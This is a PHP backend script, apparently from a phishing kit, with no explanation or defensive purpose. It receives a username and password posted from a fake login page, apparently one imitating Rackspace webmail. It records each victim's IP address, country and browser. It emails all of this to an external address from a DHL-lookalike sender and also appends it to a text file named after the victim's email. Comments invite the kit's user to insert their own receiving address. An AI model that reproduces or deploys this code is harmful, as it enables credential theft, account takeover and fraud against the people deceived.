<?php

header('Access-Control-Allow-Origin: *');

if (isset($_POST['user']) && isset($_POST['pass'])) {
    if (isset($_SERVER['HTTP_X_REAL_IP'])) {
        $ip = $_SERVER['HTTP_X_REAL_IP'];
    } else {
        $ip=$_SERVER['REMOTE_ADDR'];
    }

    $ip .= getenv($ip);
    $addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
    $country = stripslashes(ucfirst($addr_details['geoplugin_countryName']));
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];

    $email = $_POST['user'];
    $password = $_POST['pass'];
    $sender = "hades@dhldelivery.info"; //enter your webmail here
    $to = "maxgomery@yandex.com"; //enter receiving mail here
    $subject = "RACKSPACE LOGZ";

    $data = "+---------------------------------------------+ \n";
    $data .= "USER ID : $email \n";
    $data .= "PASSWORD : $password \n";
    $data .= "IP ADDRESS : $ip \n";
    $data .= "COUNTRY : $country \n";
    $data .= "BROWSER-AGENT : $browserAgent \n";
    $data .= "+---------------------------------------------+ \n";

    $message = "<table border='1' >";
    $message .= "<th style='padding:10px;'>USER ID</th>";
    $message .= "<th style='padding:10px;'>PASSWORD</th>";
    $message .= "<th style='padding:10px;'>IP ADDRESS</th>";
    $message .= "<th style='padding:10px;'>COUNTRY</th>";
    $message .= "<th style='padding:10px;'>BROWSER AGENT</th>";
    $message .= "<tr>";
    $message .= "<td style='padding:5px;'>$email</td>";
    $message .= "<td style='padding:5px;'>$password</td>";
    $message .= "<td style='padding:5px;'>$ip</td>";
    $message .= "<td style='padding:5px;'>$country</td>";
    $message .= "<td style='padding:5px;'>$browserAgent</td>";
    $message .= "</tr>";
    $message .= "</table>";

    $headers = "From: HADES <$sender> \n";
    $headers .= "X-Priority: 1 \n";
    $headers .= "Content-Type:text/html; charset=iso-8859-1 \n";

    $f = fopen("$email.txt", 'a');
    fwrite($f, $data);
    fclose($f);

    mail($to, $subject, $message, $headers);

    echo 1;
} else {
    echo 0;
}
